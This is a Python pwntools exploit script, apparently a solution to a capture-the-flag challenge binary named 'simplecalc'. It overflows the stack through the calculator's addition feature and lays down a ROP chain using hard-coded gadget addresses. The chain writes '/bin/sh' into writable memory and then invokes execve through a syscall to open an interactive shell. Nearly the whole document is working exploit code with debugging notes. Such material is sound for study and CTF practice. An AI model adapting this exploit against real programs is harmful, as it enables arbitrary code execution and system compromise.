from pwn import *

p = process(["./simplecalc"])

elf = ELF("./simplecalc")

# context.log_level = 'debug'

def add_4bytes(num):
    x = num - 3000000
    y = num - x
    p.sendlineafter(b"=> ",b"1")
    p.sendlineafter(b"x: ",str(x))
    p.sendlineafter(b"y: ",str(y))

def add(z):
    x = z & 0xffffffff # 1st 4 bytes 0x00000000000xxxxxxxxx
    y = ((z & 0xffffffff00000000) >> 32) # 2nd 4 bytes 0xxxxxxxxxx00000000000
    add_4bytes(x)
    add_4bytes(y)

pop_rax = 0x000000000044db34
pop_rdi = 0x0000000000401b73
pop_rsi = 0x0000000000401c87
pop_rdx = 0x0000000000437a85
ret = 0x00000000004001c7
syscall = 0x0000000000400488

mov_rdx_rdi = 0x0000000000400aba # mov qword ptr [rdi], rdx ; ret
str_binsh = int.from_bytes(b"/bin/sh\x00","little")
add_binsh = 0x00000000006c1000

# br *0x0000000000401545 -> memcpy (note address stack that stored our input)
# 0x00007fffffffdc60
# br *0x0000000000401589 -> ret (note address stack of ret address)
# p/d ret - memcpy
# -> 72 ->> 72/8 = 9. Range 9 address

p.sendlineafter(b"calculations: ",b"100")

# First rop to store /bin/bash string
# Write "/bin/bash" to 0x00000000006c1000
# vmmap -> find rw permission
# x/20gx 0x00000000006c1000 -> empty

for i in range(9):
    add(0)

add(pop_rdi)
add(add_binsh)
add(pop_rdx)
add(str_binsh)
add(mov_rdx_rdi)

# Create ROP to spawn execve("/bin/bash",0,0)
# rax -> 59 (execve)
# rdi -> addr bin_sh
# rsi -> 0x0
# rdx -> 0x0
# syscall

add(pop_rax)
add(59)

add(pop_rdi)
add(add_binsh)

add(pop_rsi)
add(0)

add(pop_rdx)
add(0)

add(syscall)

# gdb.attach(p)

p.sendlineafter(b"=>",b"5")

p.interactive()